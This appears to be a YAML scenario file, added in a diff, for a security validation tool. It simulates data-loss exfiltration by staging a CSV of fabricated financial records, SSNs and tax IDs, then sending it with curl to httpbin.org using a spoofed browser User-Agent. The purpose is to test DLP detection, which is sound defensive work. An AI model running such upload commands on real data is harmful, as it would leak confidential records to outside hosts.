@@ -1,0 +1,97 @@
+scenario_id: "SIM-DLP-003"
+name: "Unsanctioned SaaS Web Upload of Confidential Financial Data"
+version: "1.0"
+status: "active"
+plane: "DLP"
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: "UCS-DLP-06"
+tc_ref: "TC-DLP-11"
+tc_refs:
+  - "TC-DLP-11"
+uc_name: "Enterprise Data Loss Prevention"
+tc_name: "Validate DLP monitors and controls sensitive data movement across unsanctioned SaaS applications"
+
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1567.002"
+mitre_technique_name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+additional_techniques:
+  - technique: "T1074.001"
+    name: "Data Staged: Local Data Staging"
+
+threat_report: "Unit 42 - Cloud Threat Report: Shadow SaaS and Data Exfiltration"
+threat_report_url: "https://unit42.paloaltonetworks.com/cloud-threat-report/"
+
+execution_identity:
+  default: "svc-backup"
+  options:
+    - "svc-backup"
+    - "www-data"
+    - "root"
+
+push_supported: true
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "SaaS Content Inspection"
+methodology_family: "F1"
+primary_kpi: "SaaS coverage %"
+threshold:
+  kpi: "SaaS coverage %"
+  op: "≥"
+  value: 90.0
+  unit: "%"
+success_criteria: |
+  Uploading structured financial spreadsheets containing corporate revenue and PII to
+  an external unmanaged web service triggers Enterprise DLP inspection and policy alert.
+moat_tier: "LEAD"
+
+steps:
+  - id: "step-01"
+    name: "Stage confidential Q4 financial report with PII"
+    command: |
+      mkdir -p /tmp/cortex_dlp_saas
+      cat << 'EOF' > /tmp/cortex_dlp_saas/q4_unreleased_financials.csv
+      Account_ID,Client_Name,Q4_Revenue,SSN,Tax_ID,Wire_Routing
+      CORP-901,MegaCorp Inc,$14,500,000,987-65-4320,12-3456789,021000021
+      CORP-902,Globex Holdings,$8,200,000,876-54-3210,98-7654321,121000358
+      CORP-903,Initech LLC,$3,850,000,765-43-2109,45-6789012,071000013
+      EOF
+    identity: "svc-backup"
+    mitre_technique: "T1074.001"
+    expected_detections:
+      - plane: DLP
+        type: BIOC
+        description: "Confidential financial data staged on local filesystem"
+        ttp_ref: "TTP-2026-0179"
+        detection_id: "bioc-financial-data-staging"
+
+  - id: "step-02"
+    name: "Simulate HTTPS multipart upload to external storage service"
+    command: |
+      curl -sk -X POST -F "file=@/tmp/cortex_dlp_saas/q4_unreleased_financials.csv" \
+        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
+        https://httpbin.org/post || true
+    identity: "svc-backup"
+    mitre_technique: "T1567.002"
+    causality:
+      parent_step: "step-01"
+      pivot: "network_session"
+    expected_detections:
+      - plane: DLP
+        type: BIOC
+        description: "Outbound multipart upload of confidential financial records via HTTP/S"
+        ttp_ref: "TTP-2026-0179"
+        detection_id: "bioc-dlp-unsanctioned-web-upload"
+      - plane: DLP
+        type: Analytics
+        description: "Enterprise DLP alert on sensitive financial data egress"
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/cortex_dlp_saas"
+
+author: "Henry Reed"
